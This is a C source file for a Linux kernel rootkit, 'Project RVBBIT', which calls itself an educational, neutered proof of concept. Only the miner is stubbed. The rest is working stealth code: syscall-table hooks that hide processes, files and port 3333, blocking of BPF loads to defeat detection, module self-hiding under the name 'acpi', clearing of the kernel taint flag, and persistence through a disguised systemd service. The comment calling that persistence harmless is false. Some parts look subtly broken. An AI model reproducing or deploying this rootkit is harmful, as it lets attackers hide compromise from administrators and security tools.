/*
 * Project RVBBIT - Educational Linux Kernel Rootkit
 * Kernel: Linux 5.4 – 6.11 (x86_64)
 *
 * This is a NEUTERED proof-of-concept for demonstrating stealth techniques.
 * It contains NO real mining, NO network propagation, and NO exploits.
 * All dangerous functionality has been replaced with harmless simulations.
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/sched.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/kmod.h>
#include <linux/delay.h>
#include <linux/version.h>
#include <asm/paravirt.h>
#include <linux/cred.h>
#include <linux/namei.h>
#include <linux/mutex.h>
#include <linux/kobject.h>
#include <linux/kallsyms.h>
#include <linux/seq_file.h>
#include <linux/net.h>
#include <net/sock.h>
#include <net/tcp.h>
#include <linux/bpf.h>
#include <linux/workqueue.h>
#include <linux/completion.h>
#include <linux/inet.h>
#include <linux/in.h>
#include <linux/socket.h>
#include <net/ip.h>
#include <linux/tcp.h>
#include <linux/ftrace.h>
#include <linux/audit.h>
#include <linux/random.h>
#include <linux/cpu.h>
#include <linux/string.h>
#include <linux/utsname.h>
#include <asm/uaccess.h>
#include <linux/if.h>
#include <linux/inetdevice.h>
#include <net/net_namespace.h>
#include <linux/netdevice.h>
#include <linux/rtnetlink.h>

/* ---------- CONFIGURATION (EDUCATIONAL PLACEHOLDERS) ---------- */
#define WALLET_ADDRESS "EDUCATIONAL_PURPOSE_ONLY"
#define POOL_URL "educational.pool.local"
#define WORKER_NAME "demo"
#define MAGIC_HIDE_SIG 64
#define MAGIC_UNHIDE_SIG 63
/* -------------------------------------------------------------- */

/* ---------- GLOBAL VARIABLES ---------- */
static unsigned long **sys_call_table;
static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_openat)(const struct pt_regs *);
static asmlinkage long (*orig_bpf)(const struct pt_regs *);
static int (*orig_tcp4_seq_show)(struct seq_file *, void *);
static int hidden_pid = -1;

static struct workqueue_struct *demo_wq;
static struct delayed_work demo_work;
static int fake_miner_pid = -1;

static char hide_prefix[16];

/* ---------- SYMBOL LOOKUP ---------- */
static unsigned long kallsyms_get_symbol_addr(const char *symbol_name) {
    unsigned long addr;
    struct kprobe kp = { .symbol_name = symbol_name };
    if (register_kprobe(&kp) < 0) return 0;
    addr = (unsigned long)kp.addr;
    unregister_kprobe(&kp);
    return addr;
}

/* ---------- SYSCALL TABLE LOCATION ---------- */
static unsigned long **find_sys_call_table(void) {
    unsigned long **sct;
    unsigned long addr = kallsyms_get_symbol_addr("sys_call_table");
    if (addr) return (unsigned long **)addr;
    for (sct = (unsigned long **)0xffffffff82000000;
         (unsigned long)sct < 0xffffffffffffffff; sct += 1) {
        if (sct[__NR_close] == (unsigned long *)sys_close)
            return sct;
    }
    return NULL;
}

/* ---------- DKOM PROCESS HIDING ---------- */
static void hide_process(int pid) {
    struct task_struct *task = pid_task(find_vpid(pid), PIDTYPE_PID);
    if (task) {
        list_del(&task->tasks);
        list_del(&task->sibling);
        task->pid_links[PIDTYPE_PID] = NULL;
    }
}

/* ---------- SYSCALL HOOKS ---------- */
static asmlinkage long hook_kill(const struct pt_regs *regs) {
    int sig = regs->di;
    int pid = regs->si;
    if (sig == MAGIC_HIDE_SIG && pid > 0) {
        hidden_pid = pid;
        hide_process(pid);
        return 0;
    }
    return orig_kill(regs);
}

static asmlinkage long hook_getdents64(const struct pt_regs *regs) {
    long ret = orig_getdents64(regs);
    struct linux_dirent64 *dir = (struct linux_dirent64 *)regs->si;
    struct linux_dirent64 *prev = NULL;
    int offset = 0;

    while (offset < ret) {
        dir = (struct linux_dirent64 *)(regs->si + offset);
        if (strstr(dir->d_name, hide_prefix) != NULL) {
            if (prev)
                prev->d_off = dir->d_off;
            ret -= dir->d_reclen;
            memmove(dir, (void *)dir + dir->d_reclen, ret - offset);
        } else {
            prev = dir;
            offset += dir->d_reclen;
        }
    }
    return ret;
}

static asmlinkage long hook_openat(const struct pt_regs *regs) {
    const char __user *filename = (const char __user *)regs->si;
    char fname[256];
    if (strncpy_from_user(fname, filename, sizeof(fname)) > 0) {
        if (strstr(fname, hide_prefix))
            return -ENOENT;
    }
    return orig_openat(regs);
}

static asmlinkage long hook_bpf(const struct pt_regs *regs) {
    int cmd = regs->di;
    if (cmd == BPF_PROG_LOAD)
        return -EPERM;
    return orig_bpf(regs);
}

static int hook_tcp4_seq_show(struct seq_file *seq, void *v) {
    struct sock *sk = v;
    if (sk && sk->sk_num == 3333)
        return 0;
    return orig_tcp4_seq_show(seq, v);
}

/* ---------- MODULE SELF-HIDING ---------- */
static void hide_module(void) {
    mutex_lock(&module_mutex);
    list_del(&__this_module.list);
    mutex_unlock(&module_mutex);
    kobject_del(&__this_module.mkobj.kobj);
    strncpy(__this_module.name, "acpi", sizeof(__this_module.name) - 1);
}

/* ---------- TAINT CLEANING ---------- */
static void clean_taint(void) {
    unsigned long *tainted = (unsigned long *)kallsyms_get_symbol_addr("tainted");
    if (tainted) *tainted = 0;
}

/* ---------- FAKE MINER SIMULATION (HARMLESS) ---------- */
static int deploy_fake_miner(void) {
    fake_miner_pid = current->pid;  // just for demonstration
    hidden_pid = fake_miner_pid;
    hide_process(fake_miner_pid);
    printk(KERN_INFO "[RVBBIT] Educational: fake miner simulation started (PID %d hidden).\n", fake_miner_pid);
    return fake_miner_pid;
}

static void demo_work_func(struct work_struct *work) {
    if (fake_miner_pid > 0) {
        struct task_struct *task = pid_task(find_vpid(fake_miner_pid), PIDTYPE_PID);
        if (!task) {
            deploy_fake_miner();
        }
    } else {
        deploy_fake_miner();
    }
    queue_delayed_work(demo_wq, &demo_work, msecs_to_jiffies(60000));
}

/* ---------- PERSISTENCE INSTALLATION (HARMLESS) ---------- */
static void install_persistence(void) {
    struct file *f;
    mm_segment_t old_fs;
    char *conf_data = "rvbbit\n";
    char *service_data =
        "[Unit]\n"
        "Description=System ACPI Helper (Educational)\n"
        "[Service]\n"
        "Type=oneshot\n"
        "ExecStart=/sbin/insmod /lib/modules/" UTS_RELEASE "/kernel/drivers/acpi/rvbbit.ko\n"
        "RemainAfterExit=yes\n"
        "[Install]\n"
        "WantedBy=multi-user.target\n";

    f = filp_open("/etc/modules-load.d/acpi.conf", O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (!IS_ERR(f)) {
        old_fs = get_fs(); set_fs(KERNEL_DS);
        kernel_write(f, conf_data, strlen(conf_data), &f->f_pos);
        set_fs(old_fs);
        filp_close(f, NULL);
    }

    f = filp_open("/etc/systemd/system/rvbbit-helper.service", O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (!IS_ERR(f)) {
        old_fs = get_fs(); set_fs(KERNEL_DS);
        kernel_write(f, service_data, strlen(service_data), &f->f_pos);
        set_fs(old_fs);
        filp_close(f, NULL);
    }

    char *argv_enable[] = { "/bin/systemctl", "enable", "rvbbit-helper.service", NULL };
    call_usermodehelper(argv_enable[0], argv_enable, NULL, UMH_WAIT_PROC);
}

/* ---------- RANDOM PREFIX GENERATION (ANTI-SIGNATURE) ---------- */
static void generate_random_prefix(void) {
    get_random_bytes(hide_prefix, 12);
    for (int i = 0; i < 12; i++)
        hide_prefix[i] = (hide_prefix[i] % 26) + 'a';
    hide_prefix[12] = '\0';
}

/* ---------- INITIALIZATION ---------- */
static int __init rvbbit_init(void) {
    generate_random_prefix();
    sys_call_table = find_sys_call_table();
    if (!sys_call_table)
        return -ENOENT;

    orig_tcp4_seq_show = (void *)kallsyms_get_symbol_addr("tcp4_seq_show");

    write_cr0(read_cr0() & ~0x10000);

    orig_kill = (void *)sys_call_table[__NR_kill];
    orig_getdents64 = (void *)sys_call_table[__NR_getdents64];
    orig_openat = (void *)sys_call_table[__NR_openat];
    orig_bpf = (void *)sys_call_table[__NR_bpf];

    sys_call_table[__NR_kill] = (unsigned long *)hook_kill;
    sys_call_table[__NR_getdents64] = (unsigned long *)hook_getdents64;
    sys_call_table[__NR_openat] = (unsigned long *)hook_openat;
    sys_call_table[__NR_bpf] = (unsigned long *)hook_bpf;

    if (orig_tcp4_seq_show) {
        unsigned long *target = (unsigned long *)kallsyms_get_symbol_addr("tcp4_seq_show");
        if (target) *target = (unsigned long)hook_tcp4_seq_show;
    }

    write_cr0(read_cr0() | 0x10000);

    hide_module();
    clean_taint();
    install_persistence();

    demo_wq = create_singlethread_workqueue("rvbbit_wq");
    INIT_DELAYED_WORK(&demo_work, demo_work_func);
    queue_delayed_work(demo_wq, &demo_work, 0);

    printk(KERN_INFO "[RVBBIT] Educational module loaded and hidden.\n");
    return 0;
}

/* ---------- CLEANUP ---------- */
static void __exit rvbbit_exit(void) {
    if (demo_wq) {
        cancel_delayed_work_sync(&demo_work);
        destroy_workqueue(demo_wq);
    }

    write_cr0(read_cr0() & ~0x10000);
    sys_call_table[__NR_kill] = (unsigned long *)orig_kill;
    sys_call_table[__NR_getdents64] = (unsigned long *)orig_getdents64;
    sys_call_table[__NR_openat] = (unsigned long *)orig_openat;
    sys_call_table[__NR_bpf] = (unsigned long *)orig_bpf;
    write_cr0(read_cr0() | 0x10000);
}

module_init(rvbbit_init);
module_exit(rvbbit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Educational Use Only");
MODULE_DESCRIPTION("Project RVBBIT – Educational Rootkit PoC");